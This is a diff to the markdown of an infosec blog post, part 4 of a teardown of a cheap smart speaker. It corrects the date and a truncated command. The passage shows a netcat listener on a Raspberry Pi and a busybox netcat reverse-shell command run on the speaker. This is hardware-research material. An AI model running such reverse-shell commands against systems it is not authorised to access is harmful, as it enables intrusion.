@@ -2,7 +2,7 @@
 layout: post
 slug: cheap-smart-speaker-teardown-part4
 title:  "Cheap Smart Speaker Teardown part 4"
-date:   2022-11-18 18:00:00
+date:   2022-12-18 18:00:00
 categories:
 - infosec
 tags:
@@ -630,7 +630,7 @@ nc –lvp 6789
 
 On the target - connect to the pi on port 6789 and then start the shell and pipe the I/O through:
 ```
-busybox nc 192.168.255.252 6789 -e /bin/s
+busybox nc 192.168.255.252 6789 -e /bin/sh
 ```
 
 Doing it this way is annoying, if you press CTRL+C on the pi it kills the connection... there are better ways.
